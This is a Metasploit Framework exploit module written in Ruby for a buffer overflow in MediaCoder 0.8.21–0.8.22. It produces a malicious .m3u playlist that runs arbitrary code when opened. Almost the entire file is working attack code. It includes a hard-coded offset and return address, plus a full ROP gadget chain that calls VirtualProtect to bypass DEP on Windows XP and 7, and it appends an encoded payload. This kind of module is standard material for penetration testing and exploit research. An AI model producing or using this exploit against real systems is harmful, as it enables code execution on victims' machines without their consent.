##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MediaCoder .M3U Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability
        occurs when adding an .m3u, allowing arbitrary code execution under the context
        of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder
        runs with DEP. This module has been tested successfully on MediaCoder 0.8.21.5539
        to 0.8.22.5530 over Windows XP SP3 and Windows 7 SP0.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'metacom', # Vulnerability discovery and PoC
          'modpr0be <modpr0be[at]spentera.com>', # Metasploit module
          'otoy <otoy[at]spentera.com>' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '94522' ],
          [ 'EDB', '26403' ]
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'seh'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'Space'           => 1200,
          'BadChars'        => "\x00\x5c\x40\x0d\x0a",
          'DisableNops'     => true,
          'StackAdjustment' => -3500
        },
      'Targets'        =>
        [
          [ 'MediaCoder 0.8.21 - 0.8.22 / Windows XP SP3 / Windows 7 SP0',
            {
              # stack pivot (add esp,7ac;pop pop pop pop ret from postproc-52.dll)
              'Ret'    => 0x6afd4435,
              'Offset'  => 849,
              'Max'    => 5000
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jun 24 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u'])
      ], self.class)

  end

  def junk(n=1)
    return [rand_text_alpha(4).unpack("L")[0]] * n
  end

  def nops(rop=false, n=1)
    return rop ? [0x6ab16202] * n : [0x90909090] * n
  end

  def exploit
    # fixed rop from mona.py :)
    rop_gadgets =
    [
      nops(true,35),  # ROP NOP
      0x100482ff,  # POP EAX # POP EBP # RETN [jpeg.dll]
      0xffffffc0,  # negate will become 0x00000040
      junk,
      0x66d9d9ba,  # NEG EAX # RETN [avutil-52.dll]
      0x6ab2241d,  # XCHG EAX,EDX # ADD ESP,2C # POP EBP # POP EDI # POP ESI # POP EBX # RETN [swscale-2.dll]
      junk(15),    # reserve more junk for add esp,2c
      0x1004cc03,  # POP ECX # RETN [jpeg.dll]
      0x6ab561b0,  # ptr to &VirtualProtect() [IAT swscale-2.dll]
      0x66d9feee,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [avutil-52.dll]
      0x6ab19780,  # XCHG EAX,ESI # RETN [swscale-2.dll]
      0x66d929f5,  # POP EAX # POP EBX # RETN [jpeg.dll]
      0xfffffcc0,  # negate will become 0x0000033f
      junk,
      0x6ab3c65a,  # NEG EAX # RETN [postproc-52.dll]
      0x1004cc03,  # POP ECX # RETN [jpeg.dll]
      0xffffffff,  #
      0x660166e9,  # INC ECX # SUB AL,0EB # RETN [libiconv-2.dll]
      0x66d8ae48,  # XCHG ECX,EBX # RETN [avutil-52.dll]
      0x1005f6e4,  # ADD EBX,EAX # OR EAX,3000000 # RETN [jpeg.dll]
      0x6ab3d688,  # POP ECX # RETN [jpeg.dll]
      0x6ab4ead0,  # Writable address [avutil-52.dll]
      0x100444e3,  # POP EDI # RETN [swscale-2.dll]
      nops(true),  # ROP NOP [swscale-2.dll]
      0x100482ff,  # POP EAX # POP EBP # RETN [jpeg.dll]
      nops,        # Regular NOPs
      0x6ab01c06,  # PUSH ESP# RETN [swscale-2.dll]
      0x6ab28dda,  # PUSHAD # RETN [swscale-2.dll]
    ].flatten.pack("V*")

    sploit = "http://"
    sploit << rand_text(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << rop_gadgets
    sploit << make_nops(16)
    sploit << payload.encoded
    sploit << rand_text(target['Max']-sploit.length)

    file_create(sploit)
  end
end
